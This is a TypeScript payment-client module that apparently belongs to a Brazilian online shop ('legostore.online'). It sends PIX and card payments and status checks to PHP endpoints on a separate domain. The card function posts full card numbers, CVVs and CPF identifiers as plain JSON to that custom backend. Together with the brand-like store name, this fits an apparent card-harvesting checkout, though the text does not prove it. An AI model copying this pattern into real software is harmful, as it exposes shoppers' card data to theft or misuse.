const API_CONFIG = {
  API_BASE_URL: "https://monkeycheckout.online/vakinha-luky",
  FRONTEND_URL: "https://legostore.online", // Adicionado baseado no config funcional
}

export interface PixPaymentData {
  amount: number
  email: string
  name?: string
  phone?: string
  cpf?: string
  description?: string
  utm_source?: string
  utm_medium?: string
  utm_campaign?: string
  utm_content?: string
  utm_term?: string
  xcod?: string
  sck?: string
  utm_id?: string
}

export interface CardPaymentData {
  amount: number
  email: string
  name: string
  phone: string
  cpf: string
  description: string
  card: {
    number: string
    holder_name: string
    exp_month: string
    exp_year: string
    cvv: string
  }
  installments: number
  utm_source?: string
  utm_medium?: string
  utm_campaign?: string
  utm_content?: string
  utm_term?: string
  xcod?: string
  sck?: string
  utm_id?: string
}

export interface PixResponse {
  success: boolean
  qrcode?: string
  pixCopiaECola?: string
  pixCode?: string
  token?: string
  message?: string
  error?: string
}

export interface CardPaymentResponse {
  success: boolean
  transaction_id?: string
  status?: string
  error?: string
}

export interface PaymentStatus {
  success: boolean
  status: "PENDING" | "APPROVED" | "REJECTED"
  error?: string
}

export function getUtmParams() {
  if (typeof window === "undefined") return {}

  const isMobile = window.innerWidth < 768
  console.log(`[UTM] getUtmParams - Dispositivo: ${isMobile ? "Mobile" : "Desktop"}`)

  const savedUtmParams = localStorage.getItem("utmParams")
  if (savedUtmParams) {
    try {
      const parsedParams = JSON.parse(savedUtmParams)
      console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - UTM params carregados do localStorage:`, parsedParams)
      return parsedParams
    } catch (e) {
      console.error(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Erro ao parsear UTM params do localStorage:`, e)
    }
  } else {
    console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Nenhum UTM encontrado no localStorage`)
  }

  // Fallback para URL atual se não houver no localStorage
  const urlParams = new URLSearchParams(window.location.search)
  const utmFromUrl = {
    utm_source: urlParams.get("utm_source"),
    utm_medium: urlParams.get("utm_medium"),
    utm_campaign: urlParams.get("utm_campaign"),
    utm_content: urlParams.get("utm_content"),
    utm_term: urlParams.get("utm_term"),
    xcod: urlParams.get("xcod"),
    sck: urlParams.get("sck"),
    utm_id: urlParams.get("utm_id"),
  }

  const filteredUtmFromUrl = Object.fromEntries(
    Object.entries(utmFromUrl).filter(([_, value]) => value !== null && value !== ""),
  )

  if (Object.keys(filteredUtmFromUrl).length > 0) {
    console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Usando UTM da URL atual como fallback:`, filteredUtmFromUrl)
  } else {
    console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Nenhum UTM encontrado na URL atual`)
  }

  return filteredUtmFromUrl
}

export async function createPixPayment(data: PixPaymentData): Promise<PixResponse> {
  try {
    console.log("🚀 Iniciando processo de pagamento PIX...")

    // Capturar parâmetros UTM
    const utmParams = getUtmParams()

    // Preparar dados conforme o HTML funcional
    const paymentData = {
      ...utmParams,
      nome: data.name || "",
      email: data.email,
      cpf: data.cpf?.replace(/\D/g, "") || "",
      telefone: data.phone?.replace(/\D/g, "") || "",
      amount: data.amount, // Adicionando o valor no corpo da requisição
    }

    console.log("📤 Enviando dados para API:", {
      valor: data.amount,
      dados: paymentData,
    })

    // Fazer requisição conforme o HTML funcional
    const response = await fetch(`${API_CONFIG.API_BASE_URL}/pagamento.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(paymentData),
    })

    const result = await response.json()
    console.log("📥 Resposta da API:", result)

    if (result.success) {
      return {
        success: true,
        qrcode: result.pixCopiaECola || result.pixCode || result.qrcode,
        pixCopiaECola: result.pixCopiaECola,
        pixCode: result.pixCode,
        token: result.token,
      }
    } else {
      return {
        success: false,
        error: result.message || result.error || "Erro ao criar pagamento PIX",
      }
    }
  } catch (error) {
    console.error("❌ Erro na API PIX:", error)
    return {
      success: false,
      error: "Erro de conexão com a API",
    }
  }
}

export async function createCardPayment(data: CardPaymentData): Promise<CardPaymentResponse> {
  try {
    console.log("🚀 Iniciando processo de pagamento por cartão...")

    // Capturar parâmetros UTM
    const utmParams = getUtmParams()

    const cardPaymentData = {
      ...utmParams,
      amount: data.amount,
      paymentMethod: "credit_card",
      installments: data.installments,
      card: {
        number: data.card.number.replace(/\s/g, ""),
        holder_name: data.card.holder_name, // Mantendo holder_name como na API
        expirationMonth: Number.parseInt(data.card.exp_month), // Convertendo para número
        expirationYear: Number.parseInt(data.card.exp_year), // Convertendo para número
        cvv: data.card.cvv,
      },
      name: data.name,
      email: data.email,
      cpf: data.cpf.replace(/\D/g, ""),
      phone: data.phone.replace(/\D/g, ""),
      description: data.description,
    }

    console.log("📤 Enviando dados do cartão para API:", {
      ...cardPaymentData,
      card: { ...cardPaymentData.card, number: "****", cvv: "***" },
    })

    const response = await fetch(`${API_CONFIG.API_BASE_URL}/pagamento-cartao.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(cardPaymentData),
    })

    const result = await response.json()
    console.log("📥 Resposta da API de cartão:", result)

    if (result.success) {
      return {
        success: true,
        transaction_id: result.transaction_id,
        status: result.status || "approved",
      }
    } else {
      return {
        success: false,
        error: result.message || result.error || "Erro ao processar pagamento por cartão",
      }
    }
  } catch (error) {
    console.error("❌ Erro na API de cartão:", error)
    return {
      success: false,
      error: "Erro de conexão com a API de pagamento",
    }
  }
}

export async function checkPaymentStatus(transactionId: string): Promise<PaymentStatus> {
  try {
    console.log("Verificando status para transação:", transactionId)

    const response = await fetch(`${API_CONFIG.API_BASE_URL}/verificar.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        idtransaction: transactionId,
      }),
    })

    const result = await response.json()
    console.log("Resposta da verificação:", result)

    return {
      success: result.success,
      status: result.status,
      error: result.error,
    }
  } catch (error) {
    console.error("Erro ao verificar status:", error)
    return {
      success: false,
      status: "PENDING",
      error: "Erro de conexão",
    }
  }
}

export function generateQRCodeUrl(pixCode: string): string {
  return `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}&ecc=M&color=000000&bgcolor=FFFFFF&qzone=2&format=png`
}

export function maskCPF(value: string): string {
  return value
    .replace(/\D/g, "")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})/, "$1-$2")
    .replace(/(-\d{2})\d+?$/, "$1")
}

export function maskPhone(value: string): string {
  return value
    .replace(/\D/g, "")
    .replace(/(\d{2})(\d)/, "($1) $2")
    .replace(/(\d{5})(\d)/, "$1-$2")
    .replace(/(-\d{4})\d+?$/, "$1")
}

export function maskMoney(value: string): string {
  let v = value.replace(/\D/g, "")
  v = (Number.parseInt(v) / 100).toFixed(2) + ""
  v = v.replace(".", ",")
  v = v.replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1.")
  return v
}

export function validateEmail(email: string): boolean {
  return email.includes("@") && email.includes(".")
}
